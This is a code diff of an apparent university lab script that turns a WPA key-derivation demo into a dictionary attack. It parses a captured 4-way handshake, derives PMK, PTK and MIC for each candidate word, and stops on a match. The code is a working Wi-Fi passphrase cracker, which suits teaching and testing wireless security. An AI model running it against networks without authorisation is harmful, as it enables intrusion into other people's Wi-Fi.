@@ -2,14 +2,13 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+- Derive WPA keys from Passphrase and 4-way handshake info
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+- Calculate an authentication MIC (the mic for data transmission uses the
+Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
+__author__      = "Abraham Rubinstein"
 __copyright__   = "Copyright 2017, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
@@ -18,8 +17,7 @@ __status__ 		= "Prototype"
 
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
-#from pbkdf2_math import pbkdf2_hex
-from pbkdf2 import *
+from pbkdf2_math import pbkdf2_hex #contains function to calculate 4096 rounds on passphrase and SSID
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
@@ -30,17 +28,16 @@ def customPRF512(key,A,B):
     """
     blen = 64
     i    = 0
-    R    = b''
+    R    = ''
     while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
+        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
         i+=1
         R = R+hmacsha1.digest()
     return R[:blen]
 
-# Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("./wpa_handshake.cap")
+# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
+wpa=rdpcap("wpa_handshake.cap") 
 
-#TODO: Translate
 # We analyze the capture and take the EAPOL (Handshake packets) in the order of apparition and the beacons to be able to get the SSID
 list_eapol = []
 list_beacons = []
@@ -49,6 +46,20 @@ for packet in wpa:
         list_eapol.append(packet)
     if packet.haslayer(Dot11):
         list_beacons.append(packet)
+# Here we get the values and print them for debugging reasons, all we get here is what we put on the algorithm.
+print("The AP address from pcap : ")
+print(list_eapol[0].addr2)
+print("The client address from pcap : ")
+print(list_eapol[0].addr1)
+print("The ANonce from the AP : ")
+print(list_eapol[0].load.encode("hex")[26:90])
+print("The ssid of the network form pcap : ")
+print(list_beacons[0].info)
+print("The MIC to test from pcap : ")
+print(list_eapol[3].load.encode("hex")[154:-4])
+print("Client nonce from pcap file : ")
+print(list_eapol[1].load.encode("hex")[26:90])
+
 
 # Important parameters for key derivation - some of them can be obtained from the pcap file
 passPhrase  = "actuelle" #this is the passphrase of the WPA network
@@ -79,33 +90,51 @@ B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(A
 data        = ( "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].version,4)[2:] + "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].type,4)[2:] + "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].len,6)[2:] + list_eapol[3].load.encode("hex")[:153]).ljust(198,'0') # a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") 
 data = a2b_hex(data)
 
-print ("\n\nValues used to derivate keys")
-print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid,"\n")
-print ("AP Mac: ",b2a_hex(APmac),"\n")
-print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-print ("AP Nonce: ",b2a_hex(ANonce),"\n")
-print ("Client Nonce: ",b2a_hex(SNonce),"\n")
+words = []
+# Here we load our dictionnary and put it on a list to test each word
+words = [word.rstrip('\n') for word in open("dictionnary")]
+success = False
+for word in words:
+	print "\n\nValues used to derivate keys"
+	print "============================"
+	print "Passphrase: ",word,"\n"
+	print "SSID: ",ssid,"\n"
+	print "AP Mac: ",b2a_hex(APmac),"\n"
+	print "CLient Mac: ",b2a_hex(Clientmac),"\n"
+	print "AP Nonce: ",b2a_hex(ANonce),"\n"
+	print "Client Nonce: ",b2a_hex(SNonce),"\n"
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
+	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+	pmk = pbkdf2_hex(word, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
+	#expand pmk to obtain PTK
+	ptk = customPRF512(a2b_hex(pmk),A,B)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	#calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
+	#separate ptk into different keys - represent in hex
+	KCK = b2a_hex(ptk[0:16])
+	KEK = b2a_hex(ptk[16:32])
+	TK  = b2a_hex(ptk[32:48])
+	MICK = b2a_hex(ptk[48:64])
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
+	#the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
+	MIC_hex_truncated = mic.hexdigest()[0:32]
+
+	print "\nResults of the key expansion"
+	print "============================="
+	print "PMK:\t\t",pmk,"\n"
+	print "PTK:\t\t",b2a_hex(ptk),"\n"
+	print "KCK:\t\t",KCK,"\n"
+	print "KEK:\t\t",KEK,"\n"
+	print "TK:\t\t",TK,"\n"
+	print "MICK:\t\t",MICK,"\n"
+	print "MIC:\t\t",MIC_hex_truncated,"\n"
+
+	if MIC_hex_truncated == mic_to_test:
+		print("Success ! With this passphrase " + word)
+		success = True
+                break;
+if not success:
+    print("No passphrase match")
